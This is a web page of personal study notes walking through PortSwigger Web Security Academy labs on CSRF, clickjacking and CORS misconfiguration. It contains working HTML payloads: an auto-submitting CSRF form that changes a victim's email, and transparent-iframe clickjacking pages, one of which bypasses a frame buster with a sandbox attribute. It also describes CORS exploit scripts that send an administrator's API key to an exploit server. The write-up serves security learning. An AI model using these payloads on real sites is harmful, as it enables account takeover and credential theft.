        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Random Thoughts
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Random Thoughts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Random_Thoughts/010622-1824/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Pentest or... not?
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Building a Personal Containerized Web Pentest Lab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password Management with Self-Hosted KeeWeb
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#csrf-vulnerability-with-no-defenses" class="md-nav__link">
    CSRF vulnerability with no defenses
  </a>
  
    <nav class="md-nav" aria-label="CSRF vulnerability with no defenses">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#basic-clickjacking-with-csrf-token-protection" class="md-nav__link">
    Basic clickjacking with CSRF token protection
  </a>
  
    <nav class="md-nav" aria-label="Basic clickjacking with CSRF token protection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#clickjacking-with-form-input-data-prefilled-from-a-url-parameter" class="md-nav__link">
    Clickjacking with form input data prefilled from a URL parameter
  </a>
  
    <nav class="md-nav" aria-label="Clickjacking with form input data prefilled from a URL parameter">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#clickjacking-with-a-frame-buster-script" class="md-nav__link">
    Clickjacking with a frame buster script
  </a>
  
    <nav class="md-nav" aria-label="Clickjacking with a frame buster script">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_3" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_2" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cors-vulnerability-with-basic-origin-reflection" class="md-nav__link">
    CORS vulnerability with basic origin reflection
  </a>
  
    <nav class="md-nav" aria-label="CORS vulnerability with basic origin reflection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_4" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment-exploitation" class="md-nav__link">
    Vulnerability Assessment / Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cors-vulnerability-with-trusted-null-origin" class="md-nav__link">
    CORS vulnerability with trusted null origin
  </a>
  
    <nav class="md-nav" aria-label="CORS vulnerability with trusted null origin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_5" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment-exploitation_1" class="md-nav__link">
    Vulnerability Assessment / Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="csrf-clickjacking-and-cors">CSRF, Clickjacking and CORS<a class="headerlink" href="#csrf-clickjacking-and-cors" title="Permanent link">&para;</a></h1>
<ul>
<li>CRSF (Cross Site Request Forgery) is explained in this link <a href="https://portswigger.net/web-security/csrf">here</a>.</li>
<li>CSRF token is used to defend against CSRF and more information about how it works <a href="https://portswigger.net/web-security/csrf/tokens">here</a></li>
<li><a href="https://portswigger.net/web-security/clickjacking">Clickjacking</a> differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input. </li>
<li>CORS (Cross Origin Resource Sharing) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). More about CORS and its vulnerabilities <a href="https://portswigger.net/web-security/cors">here</a>.</li>
</ul>
<h2 id="csrf-vulnerability-with-no-defenses">CSRF vulnerability with no defenses<a class="headerlink" href="#csrf-vulnerability-with-no-defenses" title="Permanent link">&para;</a></h2>
<ul>
<li>To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. </li>
</ul>
<h3 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h3>
<ul>
<li>First we need to check for the 3 conditions for CSRF to happen : </li>
</ul>
<table>
<thead>
<tr>
<th>Condition</th>
<th>Screenshot</th>
</tr>
</thead>
<tbody>
<tr>
<td>Relevant Action</td>
<td>User can update email<img alt="Pasted image 20220721182606.png" src="../Media/Pasted%20image%2020220721182606.png" /></td>
</tr>
<tr>
<td>Cookie Based Session Handling</td>
<td>When attempting to change email address only cookie is used as authentication <br><img alt="Pasted image 20220721181925.png" src="../Media/Pasted%20image%2020220721181925.png" /><img alt="Pasted image 20220721181902.png" src="../Media/Pasted%20image%2020220721181902.png" /></td>
</tr>
<tr>
<td>No unpredictable request parameters</td>
<td>There does not seem to be any unpredictable parameters. <img alt="Pasted image 20220721181925.png" src="../Media/Pasted%20image%2020220721181925.png" /></td>
</tr>
</tbody>
</table>
<h3 id="vulnerability-assessment">Vulnerability Assessment<a class="headerlink" href="#vulnerability-assessment" title="Permanent link">&para;</a></h3>
<ul>
<li>We can use Burp Pro function <code>Generate CSRF PoC</code>. Without Burp Pro, we just need to generate the HTML PoC manually.
<img alt="Pasted image 20220721182147.png" src="../Media/Pasted%20image%2020220721182147.png" /></li>
<li>We will want the auto-submit script to be enabled so that no-click is required.
<img alt="Pasted image 20220721183734.png" src="../Media/Pasted%20image%2020220721183734.png" /></li>
<li>Then simply copy-and-paste the generated PoC into the body of the exploit server.
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
  <span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0a980072046df11fc0633c5f00230008.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;wiener&amp;#64;super&amp;#45;user&amp;#46;net&quot;</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div></li>
<li>What this HTML essentially does is create a form with "Submit Request" button and that button will do a POST request to the email change-account page to the parameter value of <code>wiener@super-user.net</code></li>
</ul>
<p><img alt="Pasted image 20220721182722.png" src="../Media/Pasted%20image%2020220721182722.png" />
<img alt="Pasted image 20220721182940.png" src="../Media/Pasted%20image%2020220721182940.png" />
- As can be seen above, after the button click, <code>wiener@normal-user.net</code> is changed to <code>wiener@super-user.net</code>.</p>
<h2 id="basic-clickjacking-with-csrf-token-protection">Basic clickjacking with CSRF token protection<a class="headerlink" href="#basic-clickjacking-with-csrf-token-protection" title="Permanent link">&para;</a></h2>
<ul>
<li>This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.</li>
<li>To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.</li>
<li>You can log in to your own account using the following credentials: wiener:peter</li>
</ul>
<h3 id="enumeration_1">Enumeration<a class="headerlink" href="#enumeration_1" title="Permanent link">&para;</a></h3>
<ul>
<li>We login to the account given and there is a "Delete account" button. Our goal it seems is to trick user into clicking "Delete account".
<img alt="Pasted image 20220815174925.png" src="../Media/Pasted%20image%2020220815174925.png" /></li>
</ul>
<h3 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h3>
<ul>
<li>We create a new webpage with the HTML code below : </li>
</ul>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="w">    </span><span class="nt">iframe</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">position</span><span class="p">:</span><span class="kc">relative</span><span class="p">;</span>
<span class="w">        </span><span class="k">width</span><span class="p">:</span><span class="mi">500</span><span class="p">;</span>
<span class="w">        </span><span class="k">height</span><span class="p">:</span><span class="w"> </span><span class="mi">700</span><span class="p">;</span>
<span class="w">        </span><span class="k">opacity</span><span class="p">:</span><span class="w"> </span><span class="mf">0.001</span><span class="p">;</span>
<span class="w">        </span><span class="k">z-index</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nt">div</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">position</span><span class="p">:</span><span class="kc">absolute</span><span class="p">;</span>
<span class="w">        </span><span class="k">top</span><span class="p">:</span><span class="mi">500</span><span class="p">;</span>
<span class="w">        </span><span class="k">left</span><span class="p">:</span><span class="mi">64</span><span class="p">;</span>
<span class="w">        </span><span class="k">z-index</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>click me<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://0adb00d203113416c070200900790092.web-security-academy.net/my-account&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div>
<ul>
<li>The below page is created with <code>opacity : 0.5</code> so that we can see if click me is on top of "Delete account".</li>
</ul>
<p><img alt="Pasted image 20220815173742.png" src="../Media/Pasted%20image%2020220815173742.png" /></p>
<ul>
<li>Actual exploit page </li>
</ul>
<p><img alt="Pasted image 20220815174900.png" src="../Media/Pasted%20image%2020220815174900.png" /></p>
<ul>
<li>To solve the lab, we simply "Deliver exploit to victim".</li>
</ul>
<h2 id="clickjacking-with-form-input-data-prefilled-from-a-url-parameter">Clickjacking with form input data prefilled from a URL parameter<a class="headerlink" href="#clickjacking-with-form-input-data-prefilled-from-a-url-parameter" title="Permanent link">&para;</a></h2>
<ul>
<li>This lab extends <a href="#basic-clickjacking-with-csrf-token-protection">#Basic clickjacking with CSRF token protection</a>. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.</li>
<li>To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.</li>
<li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li>
</ul>
<h3 id="enumeration_2">Enumeration<a class="headerlink" href="#enumeration_2" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>We log in to the login page to see how the "Update email" looks like.
<img alt="Pasted image 20220815175626.png" src="../Media/Pasted%20image%2020220815175626.png" /></p>
</li>
<li>
<p>We attempt to update the email and as can be seen below, the Body parameter will need to contain <code>email=&lt;email address&gt;</code></p>
</li>
</ul>
<p><img alt="Pasted image 20220815175751.png" src="../Media/Pasted%20image%2020220815175751.png" /></p>
<h3 id="exploitation_1">Exploitation<a class="headerlink" href="#exploitation_1" title="Permanent link">&para;</a></h3>
<ul>
<li>With reference to the above exploit used we just need to append the <code>email=</code> into the url as a parameter. Below is the <code>iframe</code> that is different from the exploit above.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>click me<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://0a6600b2038d7581c07e073c0094007e.web-security-academy.net/my-account?email=attacker@email.com&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div>
<ul>
<li>Below is set at <code>opacity: 0.5;</code> so that we can see if "click me" is aligned.</li>
</ul>
<p><img alt="Pasted image 20220815180402.png" src="../Media/Pasted%20image%2020220815180402.png" /></p>
<ul>
<li>
<p>Acutal exploit
<img alt="Pasted image 20220815180505.png" src="../Media/Pasted%20image%2020220815180505.png" /></p>
</li>
<li>
<p>We simply need to send the following HTML frame and lab is solved.</p>
</li>
</ul>
<h2 id="clickjacking-with-a-frame-buster-script">Clickjacking with a frame buster script<a class="headerlink" href="#clickjacking-with-a-frame-buster-script" title="Permanent link">&para;</a></h2>
<ul>
<li>This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?</li>
<li>To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.</li>
<li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li>
</ul>
<h3 id="enumeration_3">Enumeration<a class="headerlink" href="#enumeration_3" title="Permanent link">&para;</a></h3>
<ul>
<li>The webpage given is the same as <a href="#clickjacking-with-form-input-data-prefilled-from-a-url-parameter">#Clickjacking with form input data prefilled from a URL parameter</a>.</li>
</ul>
<p><img alt="Pasted image 20220815180749.png" src="../Media/Pasted%20image%2020220815180749.png" /></p>
<ul>
<li>Only difference is a frame busting javascript.</li>
</ul>
<p><img alt="Pasted image 20220815180834.png" src="../Media/Pasted%20image%2020220815180834.png" /></p>
<ul>
<li>Basic clickjacking is averted as can be seen below.
<img alt="Pasted image 20220815181345.png" src="../Media/Pasted%20image%2020220815181345.png" /></li>
</ul>
<h3 id="exploitation_2">Exploitation<a class="headerlink" href="#exploitation_2" title="Permanent link">&para;</a></h3>
<ul>
<li>The work around for frame buster would be <code>sandbox="allow-forms"</code> a HTML5 <a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp">iframe "sandbox" attribute</a>. </li>
<li>As framebuster is a javascript, by adding the sandbox attribute to only "allow-forms" we essentially blocked the javascript from executing.</li>
<li>As can be seen below, when the sandbox attribute is added, the iframe is loaded.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>click me<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://0a3d003803725875c09e38c000dd0047.web-security-academy.net/my-account?email=aaa@attacker.com&quot;</span> <span class="na">sandbox</span><span class="o">=</span><span class="s">&quot;allow-forms&quot;</span> <span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div>
<p><img alt="Pasted image 20220815181618.png" src="../Media/Pasted%20image%2020220815181618.png" /></p>
<h2 id="cors-vulnerability-with-basic-origin-reflection">CORS vulnerability with basic origin reflection<a class="headerlink" href="#cors-vulnerability-with-basic-origin-reflection" title="Permanent link">&para;</a></h2>
<ul>
<li>This website has an insecure CORS configuration in that it trusts all origins.</li>
<li>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</li>
<li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li>
</ul>
<h3 id="enumeration_4">Enumeration<a class="headerlink" href="#enumeration_4" title="Permanent link">&para;</a></h3>
<ul>
<li>We are given the website below, as can be seen, there is nothing special in the 'View details' function and hence we will focus on "My account" function.</li>
</ul>
<p><img alt="Pasted image 20220815203129.png" src="../Media/Pasted%20image%2020220815203129.png" />
<img alt="Pasted image 20220815203116.png" src="../Media/Pasted%20image%2020220815203116.png" /></p>
<ul>
<li>"My account" function brings us to a login page where we login with our credentials <code>wiener:peter</code>.</li>
</ul>
<p><img alt="Pasted image 20220815203144.png" src="../Media/Pasted%20image%2020220815203144.png" /></p>
<ul>
<li>We are then greeted with a page below that reveals an API key.</li>
</ul>
<p><img alt="Pasted image 20220815203205.png" src="../Media/Pasted%20image%2020220815203205.png" /></p>
<ul>
<li>From the HTML, we can see that the API key details is fetched by a script from <code>/accountDetails</code> directory.</li>
</ul>
<p><img alt="Pasted image 20220815204659.png" src="../Media/Pasted%20image%2020220815204659.png" /></p>
<ul>
<li>Chronologically, we can see that there are 2 <code>GET</code> requests made after the login <code>POST</code> request.</li>
</ul>
<p><img alt="Pasted image 20220815205756.png" src="../Media/Pasted%20image%2020220815205756.png" /></p>
<ul>
<li>Looking at the 2 <code>GET</code> requests' repsonse <code>/my-account</code> and <code>/accountDetails</code> we can see that there is nothing special with the <code>/my-account</code> reponse but <code>/accountDetails</code> reponse gives a header with <code>Access-Control-Allow-Credentials: true</code> which is a CORS functionality.</li>
</ul>
<p><img alt="Pasted image 20220815210218.png" src="../Media/Pasted%20image%2020220815210218.png" />
<img alt="Pasted image 20220815205905.png" src="../Media/Pasted%20image%2020220815205905.png" /></p>
<h3 id="vulnerability-assessment-exploitation">Vulnerability Assessment / Exploitation<a class="headerlink" href="#vulnerability-assessment-exploitation" title="Permanent link">&para;</a></h3>
<ul>
<li>Hence we send this to Burp Repeater to try if there will be further server repsonse if we add an origin.</li>
</ul>
<p><img alt="Pasted image 20220815210524.png" src="../Media/Pasted%20image%2020220815210524.png" /></p>
<ul>
<li>Indeed, <code>Access-Control-Allow-Origin: true</code> is returned, and we now know CORS vulnerability exists.</li>
<li>On the exploit server we added the following javascript</li>
</ul>
<p><img alt="Pasted image 20220815211148.png" src="../Media/Pasted%20image%2020220815211148.png" /></p>
<ul>
<li>We can understand more about the exploit code from <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">here</a>.</li>
<li>this exploit assumes that when exploit is sent to victim, victim will click on to the link and follow to our exploit webserver.</li>
<li>This javascript from the exploit webserver will do a <code>GET</code> request to the vulnerable web server. <code>req.withCredentials()</code> is to make sure that <code>cross-site Access-Control</code> is set to <code>true</code>.</li>
<li><code>reqListener()</code> will obtain the reponse body and send it to access log of exploit server.</li>
</ul>
<p><img alt="Pasted image 20220815211759.png" src="../Media/Pasted%20image%2020220815211759.png" /></p>
<ul>
<li>As can be seen above, sensitive information is leaked.</li>
</ul>
<p><img alt="Pasted image 20220815211855.png" src="../Media/Pasted%20image%2020220815211855.png" />
<img alt="Pasted image 20220815211914.png" src="../Media/Pasted%20image%2020220815211914.png" /></p>
<h2 id="cors-vulnerability-with-trusted-null-origin">CORS vulnerability with trusted null origin<a class="headerlink" href="#cors-vulnerability-with-trusted-null-origin" title="Permanent link">&para;</a></h2>
<ul>
<li>This website has an insecure CORS configuration in that it trusts the <code>null</code> origin.</li>
<li>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</li>
<li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li>
</ul>
<h3 id="enumeration_5">Enumeration<a class="headerlink" href="#enumeration_5" title="Permanent link">&para;</a></h3>
<p><img alt="Pasted image 20220815213449.png" src="../Media/Pasted%20image%2020220815213449.png" />
<img alt="Pasted image 20220815213502.png" src="../Media/Pasted%20image%2020220815213502.png" /></p>
<ul>
<li>Webpage is similar to <a href="#cors-vulnerability-with-basic-origin-reflection">#CORS vulnerability with basic origin reflection</a> where the difference is in the value of <code>Origin:</code> header.</li>
</ul>
<h3 id="vulnerability-assessment-exploitation_1">Vulnerability Assessment / Exploitation<a class="headerlink" href="#vulnerability-assessment-exploitation_1" title="Permanent link">&para;</a></h3>
<p><img alt="Pasted image 20220815213554.png" src="../Media/Pasted%20image%2020220815213554.png" />
<img alt="Pasted image 20220815213748.png" src="../Media/Pasted%20image%2020220815213748.png" /></p>
<ul>
<li>As can be seen above, when <code>Origin:</code> is a webpage, "Access-Control" is not enabled, but if <code>Origin:</code> is <code>null</code>, "Access-Control" is enabled.</li>
</ul>
<p><img alt="Pasted image 20220815214144.png" src="../Media/Pasted%20image%2020220815214144.png" />
<img alt="Pasted image 20220815214128.png" src="../Media/Pasted%20image%2020220815214128.png" /></p>
<ul>
<li>We sent the same script (different url) as the one in <a href="#cors-vulnerability-with-basic-origin-reflection">#CORS vulnerability with basic origin reflection</a> but as can be seen above we do not get the desired result.</li>
<li>There could be some defences employed in the victim's site similar to <a href="#clickjacking-with-a-frame-buster-script">#Clickjacking with a frame buster script</a>.</li>
<li>Hence we add an HTML iframe sandbox to "allow script" like below.</li>
</ul>
<p><img alt="Pasted image 20220815214645.png" src="../Media/Pasted%20image%2020220815214645.png" /></p>
<ul>
<li>We check the access log again and we get the credentials.</li>
</ul>
<p><img alt="Pasted image 20220815214716.png" src="../Media/Pasted%20image%2020220815214716.png" />
<img alt="Pasted image 20220815215855.png" src="../Media/Pasted%20image%2020220815215855.png" />
<img alt="Pasted image 20220815215912.png" src="../Media/Pasted%20image%2020220815215912.png" /></p>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.81fa17fe.min.js"></script>
      
    
  </body>
</html>